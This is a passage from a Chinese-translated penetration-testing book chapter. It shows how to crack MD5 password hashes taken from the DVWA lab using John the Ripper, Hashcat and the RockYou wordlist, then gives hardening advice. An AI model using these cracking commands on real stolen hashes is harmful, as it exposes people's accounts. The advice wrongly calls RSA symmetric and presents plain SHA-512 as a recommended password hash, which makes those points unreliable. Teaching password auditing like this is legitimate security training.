1.  `iloveyou`

1.  `admin`

1.  `welcome`

# 使用离线破解工具

如果您能够从应用程序中检索加密信息，您可能希望测试加密的强度以及密钥的有效性，即保护信息的能力。为此，Kali Linux 包含了两个最受欢迎和有效的离线破解工具：John the Ripper 和 Hashcat。

在第五章中的*检测和利用基于注入的漏洞*一节中，我们提取了一组用户名和哈希值。在这里，我们将使用 John the Ripper（或简称为 John）和 Hashcat 尝试检索与这些哈希值对应的密码。

首先，以`username:hash`格式将哈希值和用户名检索到一个文件中，例如以下内容：

```
admin:5f4dcc3b5aa765d61d8327deb882cf99 
gordonb:e99a18c428cb38d5f260853678922e03 
1337:8d3533d75ae2c3966d7e0d4fcc69216b 
pablo:0d107d09f5bbe40cade3de5c71e9e9b7 
smithy:5f4dcc3b5aa765d61d8327deb882cf99 
user:ee11cbb19052e40b07aac0ca060c23ee 
```

# 使用 John the Ripper

John the Ripper 已经预装在 Kali Linux 中，使用非常简单。您只需键入`john`即可查看其基本用法：

```
john 
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00223.jpeg)

如果只使用命令和文件名作为参数，John 将尝试识别文件中使用的加密或哈希类型，尝试使用其默认字典进行字典攻击，然后进入暴力破解模式并尝试所有可能的字符组合。

让我们使用 Kali Linux 中包含的 RockYou 字典进行字典攻击。在 Kali Linux 的最新版本中，该列表使用 GZIP 进行压缩；因此您需要对其进行解压缩：

```
cd /usr/share/wordlists/
gunzip rockyou.txt.gz
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00224.jpeg)

现在，您可以运行 John 来破解收集到的哈希值：

```
cd ~
john hashes.txt --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00225.jpeg)

注意使用格式参数。如前所述，John 可以尝试猜测哈希的格式。我们已经知道 DVWA 中使用的哈希算法，并可以利用这些知识使攻击更加精确。

# 使用 Hashcat

在最新版本中，Hashcat 已将其两个变体（基于 CPU 和 GPU 的）合并为一个，并且在 Kali Linux 中可以找到。如果您在虚拟机中使用 Kali Linux，就像我们在本书中使用的版本一样，您可能无法使用 GPU 破解的全部功能，该功能利用了图形卡的并行处理。但是，Hashcat 仍然可以在 CPU 模式下工作。

要使用 RockYou 字典在 Hashcat 中破解文件，使用以下命令：

```
hashcat -m 0 --force --username hashes.txt /usr/share/wordlists/rockyou.txt  
```

**![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00226.jpeg)**

这里使用的参数如下：

+   `-m 0`：`0`（零）是 MD5 哈希算法的标识符

+   `--force`：此选项强制 Hashcat 在找不到 GPU 设备时运行，这对于在虚拟机中运行 Hashcat 很有用

+   `--username`: 这告诉 Hashcat 输入文件不仅包含哈希值，还包含用户名；它期望的格式是`username:hash`

+   第一个文件名始终是要破解的文件，下一个文件名是要使用的字典

几秒钟后，您将看到结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00227.jpeg)

要查看所有支持的选项和算法，请使用以下命令：

```
hashcat --help    
```

# 预防加密实现中的缺陷

对于 HTTPS 通信，请禁用所有已弃用的协议，例如任何版本的 SSL，甚至是 TLS 1.0 和 1.1。最后两个需要考虑到应用程序的目标用户，因为 TLS 1.2 可能不被旧浏览器或系统完全支持。此外，禁用弱加密算法（如 DES 和 MD5 哈希）和模式（如 ECB）也必须考虑。

此外，应用程序的响应必须在 cookie 中包含安全标志和**HTTP Strict-Transport-Security**（**HSTS**）头，以防止 SSL 剥离攻击。

有关 TLS 配置的更多信息，请访问[`www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet`](https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet)。

密码绝不能以明文形式存储，并且不建议使用加密算法来保护它们。相反，应使用单向的、加盐的哈希函数。PBKDF2、bcrypt 和 SHA-512 是推荐的替代方案。不建议使用 MD5，因为现代 GPU 可以每秒计算数百万个 MD5 哈希，这使得在几个小时或几天内使用高端计算机破解少于十个字符的任何密码成为可能。OWASP 还在这个主题上提供了一个有用的备忘单，网址为[`www.owasp.org/index.php/Password_Storage_Cheat_Sheet`](https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet)。

对于需要可恢复的敏感信息（如付款信息）的存储，使用强加密算法。AES-256、Blowfish 和 Twofish 是不错的选择。如果对称加密（如 RSA）是一个选项，应优先考虑它（[`www.owasp.org/index.php/Cryptographic_Storage_Cheat_Sheet`](https://www.owasp.org/index.php/Cryptographic_Storage_Cheat_Sheet)）。

避免使用自定义实现或创建自定义算法。更好的做法是依赖已经被使用、测试和多次攻击的内容。

# 总结

在本章中，我们回顾了密码学的基本概念，如对称和非对称加密、流密码和块密码、哈希、编码和混淆。您了解了 HTTPS 协议中安全通信的工作原理以及如何识别其实施和配置中的漏洞。然后，我们研究了在敏感信息存储和自定义加密算法创建中常见的缺陷。

我们在本章中总结了如何防止此类缺陷以及如何在传输和存储敏感信息时使 Web 应用程序更安全的方法。

在下一章中，我们将学习有关 AJAX 和 HTML5 的知识，以及它们从安全和渗透测试的角度带来的挑战和机遇，特别是涉及客户端代码时。
